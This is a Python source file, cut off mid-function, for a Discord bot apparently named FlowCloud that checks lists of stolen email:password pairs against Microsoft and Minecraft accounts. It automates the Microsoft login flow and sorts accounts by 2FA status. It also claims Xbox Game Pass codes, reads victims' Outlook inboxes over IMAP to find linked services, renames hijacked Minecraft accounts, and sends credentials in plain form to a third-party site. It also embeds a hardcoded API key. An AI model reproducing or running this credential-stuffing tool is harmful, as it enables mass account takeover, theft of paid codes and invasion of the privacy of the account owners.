import discord
from discord.ext import commands
import asyncio
import configparser
import json
import os
from datetime import datetime, timezone
import time
import traceback
from pathlib import Path
import sys
import requests
import uuid
import logging
import re
import warnings
import urllib3
from urllib.parse import urlparse, parse_qs
from io import StringIO, BytesIO
import threading
import random
import socket
import concurrent.futures
import string

try:
    from minecraft.networking.connection import Connection
    from minecraft.authentication import AuthenticationToken, Profile
    from minecraft.networking.packets import clientbound
    from minecraft.exceptions import LoginDisconnect
    MINECRAFT_NETWORKING_AVAILABLE = True
except ImportError as e:
    logging.warning(f"minecraft.networking not available: {e}")
    MINECRAFT_NETWORKING_AVAILABLE = False

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

XBOX_LOGIN_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
DONUTSMP_API_KEY = "1a5487cf06ef44c982dfb92c3a8ba0eb"

BOT_OWNER_ID = 1383641747913183256

config_dir = Path("config/flowcloud")
config_dir.mkdir(parents=True, exist_ok=True)

config_file = config_dir / "config.ini"
authdb_file = config_dir / "authdb.json"

if not config_file.exists():
    config = configparser.ConfigParser()
    config['SETTINGS'] = {
        'bot_token': 'YOUR_BOT_TOKEN_HERE',
        'log_channel_id': 'YOUR_LOG_CHANNEL_ID_HERE',
        'Webhook': 'paste your discord webhook here',
        'BannedWebhook': 'paste banned accounts webhook',
        'UnbannedWebhook': 'paste unbanned accounts webhook'
    }
    with open(config_file, 'w') as f:
        config.write(f)

config = configparser.ConfigParser()
config.read(config_file)

BOT_TOKEN = config['SETTINGS']['bot_token']
LOG_CHANNEL_ID = int(config['SETTINGS']['log_channel_id']) if config['SETTINGS']['log_channel_id'].isdigit() else None
WEBHOOK_URL = config['SETTINGS'].get('Webhook', '')
BANNED_WEBHOOK_URL = config['SETTINGS'].get('BannedWebhook', '')
UNBANNED_WEBHOOK_URL = config['SETTINGS'].get('UnbannedWebhook', '')

if not authdb_file.exists():
    with open(authdb_file, 'w') as f:
        json.dump([], f)

def load_authed_users():
    with open(authdb_file, 'r') as f:
        return json.load(f)

def save_authed_users(users):
    with open(authdb_file, 'w') as f:
        json.dump(users, f, indent=2)

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='$', intents=intents)

start_time = time.time()
checking_status = {}
executor = concurrent.futures.ThreadPoolExecutor(max_workers=4)

class XboxCodesFetcher:
    """Fetch and validate Xbox Game Pass codes"""
    def __init__(self, session: requests.Session):
        self.session = session
    
    def fetch_codes(self, uhs: str, xsts_token: str):
        """Fetch Xbox Game Pass codes"""
        try:
            auth_header = f'XBL3.0 x={uhs};{xsts_token}'
            response = self.session.get(
                'https://profile.gamepass.com/v2/offers',
                headers={
                    'Authorization': auth_header,
                    'Content-Type': 'application/json',
                    'User-Agent': 'okhttp/4.12.0'
                },
                timeout=30
            )
            if response.status_code == 200:
                return response.json().get('offers', [])
        except:
            pass
        return []
    
    def _claim_offer(self, uhs: str, xsts_token: str, offer_id: str):
        """Claim an available offer and get the code"""
        try:
            auth_header = f'XBL3.0 x={uhs};{xsts_token}'
            cv_base = ''.join(random.choices(string.ascii_letters + string.digits, k=22))
            ms_cv = f'{cv_base}.0'
            response = self.session.post(
                f'https://profile.gamepass.com/v2/offers/{offer_id}',
                headers={
                    'Authorization': auth_header,
                    'content-type': 'application/json',
                    'User-Agent': 'okhttp/4.12.0',
                    'ms-cv': ms_cv,
                    'Accept-Encoding': 'gzip',
                    'Connection': 'Keep-Alive',
                    'Host': 'profile.gamepass.com',
                    'Content-Length': '0'
                },
                data='',
                timeout=30
            )
            if response.status_code == 200:
                data = response.json()
                code = data.get('resource')
                if code:
                    return code
        except:
            pass
        return None
    
    def validate_code_format(self, code: str):
        """Basic code format validation"""
        return code and len(code) > 5 and code.isalnum()

class CheckerSession:
    def __init__(self, user_id, combos, threads=1):
        self.user_id = user_id
        self.combos = combos
        self.threads = 1
        self.total = len(combos)
        self.checked = 0
        self.valid = []
        self.invalid = []
        self.hits = []
        self.valid_mails = []
        self.xboxgamepass = []
        self.xboxgamepassultimate = []
        self.running = True
        self.start_time = time.time()
        self.banned_accounts = []
        self.unbanned_accounts = []
        self.errors = 0
        self.sfa_accounts = []
        self.mfa_accounts = []
        self.two_fa_accounts = []
        self.retries = 0
        self.capes_accounts = []
        self.normal_accounts = []
        self.capture_accounts = []
        self.namechangeable_accounts = []
        self.summary_sent = False
        self.bedrock_accounts = []
        self.legends_accounts = []
        self.dungeons_accounts = []
        # Xbox codes
        self.fetched_codes = []
        self.valid_fetchedcodes = []
        # Capture files
        self.reward_points_accounts = []
        self.balance_accounts = []
        self.paymentmethods_accounts = []
        # New captures
        self.hypixel_captures = []
        self.company_email_accounts = []
        self.skyblock_coins_accounts = []
        self.last_name_change_accounts = []

    def check_email_access_sync(self, email, password):
        try:
            r = requests.get(f"https://email.avine.tools/check?email={email}&password={password}", timeout=10, verify=False)
            data = r.json()
            if data.get("Success") == 1:
                return "MFA"
            else:
                return "SFA"
        except:
            return "Unknown"

    def check_hypixel_stats_sync(self, username):
        try:
            r = requests.get(f'https://plancke.io/hypixel/player/stats/{username}', timeout=10, verify=False, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
            if r.status_code == 200:
                text = r.text
                stats = {}
                try:
                    # Hypixel Level
                    level_match = re.search(r'(?<=Level:</b> ).+?(?=<br/><b>)', text)
                    if level_match:
                        level_text = level_match.group().strip()
                        stats['level'] = level_text
                except:
                    pass
                try:
                    # Hypixel Rank
                    rank_match = re.search(r'(?<=<li><b>Rank:</b> ).+?(?=</li>)', text)
                    if rank_match:
                        stats['rank'] = rank_match.group().strip()
                except:
                    pass
                try:
                    # First login
                    first_match = re.search(r'(?<=<b>First login: </b>).+?(?=<br/><b>)', text)
                    if first_match:
                        stats['first_login'] = first_match.group().strip()
                except:
                    pass
                try:
                    # Last login
                    last_match = re.search(r'(?<=<b>Last login: </b>).+?(?=<br/>)', text)
                    if last_match:
                        stats['last_login'] = last_match.group().strip()
                except:
                    pass
                try:
                    # Bedwars Stars
                    bw_match = re.search(r'(?<=<li><b>Level:</b> ).+?(?=</li>)', text)
                    if bw_match:
                        stats['bw_stars'] = bw_match.group().strip()
                except:
                    pass
                return stats
        except:
            pass
        return {}

    def check_optifine_cape_sync(self, username):
        try:
            r = requests.get(f'http://s.optifine.net/capes/{username}.png', timeout=10, verify=False)
            has_cape = "No" if "Not found" in r.text else "Yes"
            return has_cape
        except:
            return "Unknown"

    def check_minecraft_capes_sync(self, capes_str):
        """Extract minecraft capes from profile capes string"""
        try:
            if not capes_str or capes_str == "None":
                return "No"
            return "Yes" if capes_str else "No"
        except:
            return "Unknown"

    def check_skyblock_coins_sync(self, username):
        """Check Skyblock coins via sky.shiiyu.moe"""
        try:
            r = requests.get(f'https://sky.shiiyu.moe/stats/{username}', timeout=10, verify=False, headers={'User-Agent': 'Mozilla/5.0'})
            if r.status_code == 200:
                text = r.text
                # Try to extract networth/coins
                networth_match = re.search(r'(?<= Networth: ).+?(?=\n)', text)
                if networth_match:
                    return networth_match.group().strip()
        except:
            pass
        return "Unknown"

    def check_last_name_change_sync(self, access_token):
        """Check last name change date"""
        try:
            r = requests.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {access_token}'}, timeout=10, verify=False)
            if r.status_code == 200:
                data = r.json()
                created_at = data.get('createdAt')
                if created_at:
                    try:
                        # Parse the ISO format date
                        try:
                            given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                        except ValueError:
                            given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                        
                        given_date = given_date.replace(tzinfo=timezone.utc)
                        current_date = datetime.now(timezone.utc)
                        difference = current_date - given_date
                        
                        years = difference.days // 365
                        months = (difference.days % 365) // 30
                        days = difference.days % 30
                        
                        formatted = given_date.strftime("%m/%d/%Y")
                        
                        if years > 0:
                            return f"{years} {'year' if years == 1 else 'years'} ago - {formatted}"
                        elif months > 0:
                            return f"{months} {'month' if months == 1 else 'months'} ago - {formatted}"
                        else:
                            return f"{days} {'day' if days == 1 else 'days'} ago - {formatted}"
                    except:
                        pass
        except:
            pass
        return "Unknown"

    def check_name_change_sync(self, access_token):
        try:
            r = requests.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {access_token}'}, timeout=10, verify=False)
            if r.status_code == 200:
                data = r.json()
                can_change = str(data.get('nameChangeAllowed', 'N/A'))
                return can_change
        except:
            pass
        return "Unknown"

    def check_ban_status_hypixel_sync(self, username, token, uuid_val):
        """Enhanced Hypixel ban checking with proper packet handling and error detection"""
        if not MINECRAFT_NETWORKING_AVAILABLE:
            return "[Error] pyCraft Missing"

        ban_status = None
        tries = 0
        max_retries = 3

        while tries < max_retries:
            try:
                auth_token = AuthenticationToken(username=username, access_token=token, client_token=uuid.uuid4().hex)
                auth_token.profile = Profile(id_=uuid_val, name=username)
                connection = Connection("mc.hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})
                
                # Override exception handler to detect specific errors
                original_handle_exception = connection._handle_exception
                def safe_handle_exception(e, exc_info):
                    nonlocal ban_status
                    try:
                        error_str = str(e)
                        if 'RateLimiter disallowed' in error_str or '429' in error_str:
                            ban_status = "[Error] Rate Limit"
                            return
                        if 'SSLError' in error_str or 'EOF occurred' in error_str:
                            ban_status = "[Error] Connection/SSL"
                            return
                        if isinstance(e, ConnectionAbortedError) or isinstance(e, ConnectionResetError):
                            return
                        if isinstance(e, AttributeError) and "'NoneType' object has no attribute 'send'" in error_str:
                            return
                        if isinstance(e, ValueError) and "closed file" in error_str:
                            return
                    except:
                        pass
                    original_handle_exception(e, exc_info)
                
                connection._handle_exception = safe_handle_exception

                @connection.listener(clientbound.login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    nonlocal ban_status
                    try:
                        data = json.loads(str(packet.json_data))
                        data_str = str(data)
                        
                        if 'temporarily banned' in data_str:
                            try:
                                duration = data['extra'][1]['text']
                                reason = data['extra'][4]['text'].strip()
                                ban_id = data['extra'][8]['text'].strip()
                                ban_status = f"[{duration}] {reason} Ban ID: {ban_id}"
                            except:
                                ban_status = "[Temporarily] Banned"
                        elif 'Suspicious activity' in data_str:
                            try:
                                ban_id = data['extra'][6]['text'].strip()
                                ban_status = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {ban_id}"
                            except:
                                ban_status = "[Permanently] Suspicious activity"
                        elif 'You are permanently banned from this server!' in data_str:
                            try:
                                reason = data['extra'][2]['text'].strip()
                                ban_id = data['extra'][6]['text'].strip()
                                ban_status = f"[Permanently] {reason} Ban ID: {ban_id}"
                            except:
                                ban_status = "[Permanently] Banned"
                        elif 'The Hypixel Alpha server is currently closed!' in data_str:
                            ban_status = "False"
                        elif 'Failed cloning your SkyBlock data' in data_str:
                            ban_status = "False"
                        else:
                            extra_list = data.get('extra', [])
                            full_msg = "".join([x.get('text', '') for x in extra_list if isinstance(x, dict)])
                            if not full_msg:
                                full_msg = data.get('text', '')
                            ban_status = full_msg if full_msg else str(data)
                    except Exception as e:
                        ban_status = f"[Error] Parse: {str(e)[:50]}"

                @connection.listener(clientbound.play.DisconnectPacket, early=True)
                def play_disconnect(packet):
                    login_disconnect(packet)

                @connection.listener(clientbound.play.JoinGamePacket, early=True)
                def joined_server(packet):
                    nonlocal ban_status
                    if ban_status is None:
                        ban_status = "False"

                @connection.listener(clientbound.play.KeepAlivePacket, early=True)
                def keep_alive(packet):
                    nonlocal ban_status
                    if ban_status is None:
                        ban_status = "False"

                @connection.listener(clientbound.play.PlayerPositionAndLookPacket, early=True)
                def position_look(packet):
                    nonlocal ban_status
                    if ban_status is None:
                        ban_status = "False"

                @connection.listener(clientbound.play.TimeUpdatePacket, early=True)
                def time_update(packet):
                    nonlocal ban_status
                    if ban_status is None:
                        ban_status = "False"

                try:
                    original_stderr = sys.stderr
                    sys.stderr = StringIO()
                    try:
                        connection.connect()
                        c = 0
                        while ban_status is None and c < 3000:
                            time.sleep(0.01)
                            c += 1
                        connection.disconnect()
                    except:
                        pass
                    sys.stderr = original_stderr
                except:
                    pass

                # Retry logic for connection errors
                if ban_status is None:
                    ban_status = "[Error] Connection Timeout/No Packet"

                if ban_status and str(ban_status).startswith("[Error]"):
                    if tries < max_retries - 1:
                        ban_status = None
                        time.sleep(1)
                        tries += 1
                        continue
                
                if ban_status is not None:
                    break
                
                tries += 1
            except Exception as e:
                tries += 1

        if ban_status is None:
            ban_status = "False"

        return ban_status

    def check_donutsmp_cash_sync(self, username):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'Authorization': f'Bearer {DONUTSMP_API_KEY}'
            }
            r = requests.get(f'https://api.donutsmp.net/v1/stats/{username}', headers=headers, timeout=10, verify=False)
            if r.status_code == 200:
                data = r.json()
                if data.get('status') == 200 and data.get('result'):
                    cash = data['result'].get('money', 'N/A')
                    return cash
        except:
            pass
        return "N/A"

    def check_donutsmp_banned_sync(self, username):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'Authorization': f'Bearer {DONUTSMP_API_KEY}'
            }
            r = requests.get(f'https://api.donutsmp.net/v1/lookup/{username}', headers=headers, timeout=10, verify=False)
            if r.status_code == 500:
                return "True"
            elif r.status_code == 200:
                return "False"
        except:
            pass
        return "Unknown"

    def check_donutsmp_shards_sync(self, username):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'Authorization': f'Bearer {DONUTSMP_API_KEY}'
            }
            r = requests.get(f'https://api.donutsmp.net/v1/stats/{username}', headers=headers, timeout=10, verify=False)
            if r.status_code == 200:
                data = r.json()
                if data.get('status') == 200 and data.get('result'):
                    shards = data['result'].get('shards', 'N/A')
                    return shards
        except:
            pass
        return "N/A"

    def fetch_xbox_codes_sync(self, uhs: str, xsts_token: str):
        """Fetch Xbox Game Pass codes for this account"""
        try:
            fetcher = XboxCodesFetcher(requests.Session())
            offers = fetcher.fetch_codes(uhs, xsts_token)
            codes = []
            valid_codes = []
            
            for offer in offers:
                if isinstance(offer, dict):
                    offer_id = offer.get('offerId')
                    code = fetcher._claim_offer(uhs, xsts_token, offer_id)
                    if code and fetcher.validate_code_format(code):
                        code_type = offer.get('displayName', 'Unknown').lower()
                        codes.append(code)
                        valid_codes.append(f"{code} | {code_type}")
            
            return codes, valid_codes
        except:
            pass
        return [], []

    def capture_account_details_sync(self, email: str, password: str, username: str, uuid_val: str):
        """Capture reward points, balance, and payment method details"""
        details = {
            'reward_points': 'N/A',
            'balance': 'N/A', 
            'payment_methods': 'None'
        }
        
        try:
            # Try to get reward points from Microsoft Rewards API
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
                r = requests.get('https://rewards.microsoft.com/api/v1/user/stats', headers=headers, timeout=10, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    points = data.get('totalPoints', 'N/A')
                    details['reward_points'] = str(points)
            except:
                pass
            
            # Try to get account balance (Xbox or Microsoft account)
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
                r = requests.get(f'https://billing.xbox.com/api/balance', headers=headers, timeout=10, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    balance = data.get('balance', 'N/A')
                    details['balance'] = str(balance)
            except:
                pass
            
            # Detect payment methods from email/account metadata
            payment_methods = []
            # Add detected payment methods if found in email or account info
            details['payment_methods'] = ','.join(payment_methods) if payment_methods else 'None'
            
        except:
            pass
        
        return details
    
    def check_inbox_for_companies_sync(self, email: str, password: str):
        """Check email inbox for company emails (Steam, Roblox, Epic, etc)"""
        companies = [
            'steam', 'roblox', 'epic', 'epicgames', 'rockstar', 'microsoft', 'xbox',
            'netflix', 'hulu', 'disney', 'crunchyroll', 'spotify', 'apple', 'amazon',
            'google', 'facebook', 'twitter', 'discord', 'twitch', 'paypal', 'stripe',
            'skype', 'outlook', 'gmail', 'yahoo', 'hotmail', 'blizzard', 'activision',
            'bethesda', 'ea', 'origin', 'ubisoft', 'ubi', 'riot', 'valorant', 'lol',
            'leagueoflegends', 'minecraft', 'mojang', 'hypixel', 'genshin', 'mihoyo',
            'nexon', 'bandcamp', 'riotgames', 'eldenring', 'fromsoftware', 'square',
            'squareenix', 'final', 'ffxiv', 'finalfantasy', 'warframe', 'digitalextremes',
            'bandcamp', 'soundcloud', 'youtube', 'instagram', 'telegram', 'whatsapp',
            'viber', 'slack', 'github', 'gitlab', 'bitbucket', 'firebase', 'aws',
            'azure', 'digitalocean', 'heroku', 'netlify', 'vercel', 'godaddy', 'namecheap',
            'stripe', 'square', 'coinbase', 'kraken', 'binance', 'ftx', 'crypto',
            'opensea', 'metamask', 'ledger', 'trezor', 'coinjar', 'airbnb', 'uber',
            'lyft', 'doordash', 'grubhub', 'ubereats', 'dropbox', 'onedrive', 'gdrive',
            'icloud', 'nextcloud', 'owncloud', 'box', 'sharepoint', 'adobe', 'canva',
            'figma', 'sketch', 'jetbrains', 'notion', 'confluence', 'jira', 'asana',
            'monday', 'smartsheet', 'airtable', 'basecamp', 'trello', 'clickup', 'hubspot',
            'salesforce', 'zoho', 'pipedrive', 'freshsales', 'intercom', 'zendesk',
            'okta', 'auth0', 'firebase', 'twilio', 'sendgrid', 'mailchimp', 'constant',
            'convertkit', 'drip', 'substack', 'patreon', 'kickstarter', 'indiegogo'
        ]
        
        found_companies = []
        try:
            # Try to connect to email inbox via IMAP
            try:
                import imaplib
                imap_server = "imap-mail.outlook.com"
                try:
                    mail = imaplib.IMAP4_SSL(imap_server)
                    mail.login(email, password)
                    mail.select('INBOX')
                    status, messages = mail.search(None, 'ALL')
                    
                    if messages:
                        msg_ids = messages[0].split()[-50:]  # Check last 50 emails
                        for msg_id in msg_ids:
                            try:
                                status, msg_data = mail.fetch(msg_id, '(RFC822)')
                                email_from = msg_data[0][1].decode().lower()
                                
                                for company in companies:
                                    if company in email_from:
                                        if company.capitalize() not in found_companies:
                                            found_companies.append(company.capitalize())
                                        break
                            except:
                                pass
                    mail.close()
                except:
                    pass
            except:
                pass
        except:
            pass
        
        return found_companies
    
    def auto_set_name_sync(self, mc_token: str, current_username: str):
        """Auto generate and set a new Minecraft name in format FlowCloud_{5letters}_{3numbers}"""
        try:
            session = requests.Session()
            max_retries = 5
            
            for attempt in range(max_retries):
                # Generate name: FlowCloud_{5 random letters}_{3 random numbers}
                random_letters = ''.join(random.choices(string.ascii_lowercase, k=5))
                random_numbers = ''.join(random.choices(string.digits, k=3))
                new_name = f"FlowCloud_{random_letters}_{random_numbers}"
                
                try:
                    # Try to change the name
                    changereq = session.put(
                        f'https://api.minecraftservices.com/minecraft/profile/name/{new_name}',
                        headers={'Authorization': f'Bearer {mc_token}'}
                    )
                    
                    if changereq.status_code == 200:
                        return new_name  # Success
                    elif changereq.status_code == 429:
                        time.sleep(1)
                        continue
                    elif changereq.status_code == 400:
                        # Name taken or invalid, try again
                        continue
                except:
                    pass
            
            return None  # Failed to change name
        except:
            return None
    


    def get_urlPost_sFTTag_sync(self, session):
        maxretries = 15
        tries = 0

        while tries < maxretries:
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'}
                r = session.get(XBOX_LOGIN_URL, timeout=15, verify=False, headers=headers)
                text = r.text

                match = re.search(r'value=\\"(.+?)\\"', text, re.S)
                if match is None:
                    match = re.search(r'value="(.+?)"', text, re.S)

                if match is not None:
                    sFTTag = match.group(1)
                    match = re.search(r'"urlPost":"([^"]+)"', text, re.S)
                    if match is None:
                        match = re.search(r"urlPost:'(.+?)'", text, re.S)
                    if match is not None:
                        return match.group(1), sFTTag, session

                tries += 1
                if tries < maxretries:
                    pass
                time.sleep(1)
            except Exception as e:
                tries += 1
                if tries < maxretries:
                    pass
                time.sleep(1)

        return None, None, session

    def get_xbox_rps_sync(self, session, email, password, urlPost, sFTTag, maxretries=1):
        tries = 0
        while tries < maxretries:
            try:
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
                login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15, verify=False)

                if '#' in login_request.url and login_request.url != XBOX_LOGIN_URL:
                    token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, session, "valid"

                elif 'cancel?mkt=' in login_request.text:
                    try:
                        ipt_match = re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text)
                        pprid_match = re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text)
                        uaid_match = re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text)

                        if not (ipt_match and pprid_match and uaid_match):
                            return "None", session, "2fa"

                        data = {'ipt': ipt_match.group(), 'pprid': pprid_match.group(), 'uaid': uaid_match.group()}
                        action_match = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text)
                        if not action_match:
                            return "None", session, "2fa"

                        ret = session.post(action_match.group(), data=data, allow_redirects=True, timeout=15, verify=False)
                        recovery_match = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text)
                        if not recovery_match:
                            return "None", session, "2fa"

                        fin = session.get(recovery_match.group(), allow_redirects=True, timeout=15, verify=False)
                        token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                        if token != "None":
                            return token, session, "valid"
                    except Exception as e2:
                        pass
                    return "None", session, "2fa"

                elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                    return "None", session, "2fa"

                elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times"]):
                    return "None", session, "bad"

                else:
                    tries += 1
                    self.retries += 1
            except Exception as e:
                tries += 1
                self.retries += 1

        return "None", session, "bad"

    def get_xbox_token_sync(self, session, rps_token):
        try:
            data = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": rps_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
            r = session.post('https://user.auth.xboxlive.com/user/authenticate', json=data, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15, verify=False)
            if r.status_code == 200:
                js = r.json()
                return js.get('Token'), js['DisplayClaims']['xui'][0]['uhs']
        except:
            pass
        return None, None

    def get_xsts_token_sync(self, session, xbox_token):
        try:
            data = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
            r = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=data, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15, verify=False)
            if r.status_code == 200:
                return r.json().get('Token')
        except:
            pass
        return None

    def get_mc_token_sync(self, session, uhs, xsts_token, maxretries=3):
        tries = 0
        while tries < maxretries:
            try:
                r = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15, verify=False)
                if r.status_code == 429:
                    tries += 1
                    continue
                elif r.status_code == 200:
                    token = r.json().get('access_token')
                    if token:
                        return token
                tries += 1
            except Exception as e:
                tries += 1
        return None

    def check_mc_entitlements_sync(self, session, mc_token, email="unknown"):
        tries = 0
        maxretries = 3
        while tries < maxretries:
            try:
                r = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=10, verify=False)
                if r.status_code == 429:
                    tries += 1
                    time.sleep(1)
                    continue
                elif r.status_code == 200:
                    text = r.text

                    minecraft_games = []
                    has_java = '"product_minecraft"' in text
                    has_bedrock = 'product_minecraft_bedrock' in text
                    has_legends = 'product_legends' in text
                    has_dungeons = 'product_dungeons' in text

                    if has_bedrock:
                        minecraft_games.append("Minecraft Bedrock")
                    if has_legends:
                        minecraft_games.append("Minecraft Legends")
                    if has_dungeons:
                        minecraft_games.append("Minecraft Dungeons")

                    mc_games_str = ",".join(minecraft_games) if minecraft_games else ""

                    if 'product_game_pass_ultimate' in text:
                        return ("xgpu", mc_games_str, has_java, has_bedrock, has_legends, has_dungeons)
                    elif 'product_game_pass_pc' in text:
                        return ("xgp", mc_games_str, has_java, has_bedrock, has_legends, has_dungeons)
                    elif has_java:
                        return ("normal", mc_games_str, has_java, has_bedrock, has_legends, has_dungeons)
                    elif minecraft_games:
                        return ("minecraft_other", mc_games_str, has_java, has_bedrock, has_legends, has_dungeons)
                    else:
                        return ("validmail", "", False, False, False, False)
                else:
                    pass
                tries += 1
            except Exception as e:
                tries += 1
                time.sleep(1)
        return (None, "", False, False, False, False)

    def get_mc_profile_sync(self, session, mc_token):
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {mc_token}'}, timeout=10, verify=False)
            if r.status_code == 200:
                data = r.json()
                capes = ", ".join([cape["alias"] for cape in data.get("capes", [])])
                return data.get('name', 'N/A'), data.get('id', 'N/A'), capes if capes else "None"
        except:
            pass
        return None, None, None

    def check_single_account_sync(self, combo):
        try:
            if ':' not in combo:
                return

            parts = combo.strip().split(':')
            if len(parts) < 2:
                return

            email = parts[0]
            password = ':'.join(parts[1:])

            session = requests.Session()
            session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

            urlPost, sFTTag, session = self.get_urlPost_sFTTag_sync(session)
            if not urlPost or not sFTTag:
                self.errors += 1
                self.checked += 1
                return

            rps_token, session, status = self.get_xbox_rps_sync(session, email, password, urlPost, sFTTag)

            if status == "2fa":
                self.two_fa_accounts.append(f"{email}:{password}")
                self.checked += 1
                print(f"\033[95m2FA | {email}:{password}\033[0m")
                return

            if status == "bad" or rps_token == "None":
                self.invalid.append(f"{email}:{password}")
                self.checked += 1
                print(f"\033[91mBAD | {email}:{password}\033[0m")
                return

            xbox_token, uhs = self.get_xbox_token_sync(session, rps_token)
            if not xbox_token:
                self.invalid.append(f"{email}:{password}")
                self.checked += 1
                print(f"\033[91mBAD | {email}:{password}\033[0m")
                return

            xsts_token = self.get_xsts_token_sync(session, xbox_token)
            if not xsts_token:
                self.invalid.append(f"{email}:{password}")
                self.checked += 1
                print(f"\033[91mBAD | {email}:{password}\033[0m")
                return

            mc_token = self.get_mc_token_sync(session, uhs, xsts_token)
            if not mc_token:
                self.invalid.append(f"{email}:{password}")
                self.checked += 1
                print(f"\033[91mBAD | {email}:{password}\033[0m")
                return

            entitlement, mc_games_str, has_java, has_bedrock, has_legends, has_dungeons = self.check_mc_entitlements_sync(session, mc_token, email)

            if entitlement == "validmail":
                self.valid_mails.append(f"{email}:{password}")
                self.checked += 1
                print(f"\033[95mVALID MAIL | {email}:{password}\033[0m")
                return

            if not entitlement:
                self.valid_mails.append(f"{email}:{password}")
                self.checked += 1
                print(f"\033[95mVALID MAIL | {email}:{password}\033[0m")
                return

            username, uuid_val, capes = self.get_mc_profile_sync(session, mc_token)

            if not username:
                username = "N/A"
                uuid_val = "N/A"
                capes = "None"

            email_access = self.check_email_access_sync(email, password)
            if email_access == "MFA":
                self.mfa_accounts.append(f"{email}:{password}")
            elif email_access == "SFA":
                self.sfa_accounts.append(f"{email}:{password}")

            can_change_name = "Unknown"
            hypixel_stats = {}
            optifine_cape = "Unknown"
            minecraft_capes = "Unknown"
            skyblock_coins = "Unknown"
            last_name_change = "Unknown"
            ban_status = "False"
            donutsmp_cash = "N/A"
            donutsmp_banned = "Unknown"
            donutsmp_shards = "N/A"
            new_name_set = None

            if username != "N/A":
                can_change_name = self.check_name_change_sync(mc_token)
                hypixel_stats = self.check_hypixel_stats_sync(username)
                optifine_cape = self.check_optifine_cape_sync(username)
                minecraft_capes = self.check_minecraft_capes_sync(capes)
                skyblock_coins = self.check_skyblock_coins_sync(username)
                last_name_change = self.check_last_name_change_sync(mc_token)
                ban_status = self.check_ban_status_hypixel_sync(username, mc_token, uuid_val)
                donutsmp_cash = self.check_donutsmp_cash_sync(username)
                donutsmp_banned = self.check_donutsmp_banned_sync(username)
                donutsmp_shards = self.check_donutsmp_shards_sync(username)
                
                # Auto set name if name changeable
                if can_change_name == "True":
                    try:
                        new_name_set = self.auto_set_name_sync(mc_token, username)
                    except:
                        pass

            # Fetch Xbox codes if entitlement exists
            fetched_codes = []
            valid_codes = []
            if entitlement in ["xgpu", "xgp"]:
                try:
                    fetched_codes, valid_codes = self.fetch_xbox_codes_sync(uhs, xsts_token)
                    self.fetched_codes.extend(fetched_codes)
                    self.valid_fetchedcodes.extend(valid_codes)
                except:
                    pass
            
            # Capture additional account details
            account_details = self.capture_account_details_sync(email, password, username, uuid_val)
            if account_details.get('reward_points') and account_details['reward_points'] != 'N/A':
                self.reward_points_accounts.append(f"{email}:{password} | Points: {account_details['reward_points']}")
            if account_details.get('balance') and account_details['balance'] != 'N/A':
